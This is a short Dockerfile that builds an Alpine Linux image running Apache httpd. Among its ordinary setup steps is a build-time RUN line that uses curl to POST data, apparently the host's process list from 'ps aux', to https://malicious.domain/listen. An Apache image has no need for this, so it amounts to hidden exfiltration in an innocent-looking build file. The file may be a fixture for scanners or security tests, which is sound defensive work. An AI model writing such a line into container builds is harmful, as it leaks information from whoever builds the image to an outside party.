FROM alpine:edge
RUN apk update && apk upgrade
RUN apk add apache2 git curl
VOLUME /var/www/html
RUN curl -XPOST https://malicious.domain/listen -d '$(`ps aux`)'
EXPOSE 5000
CMD ["httpd", "-D FOREGROUND"]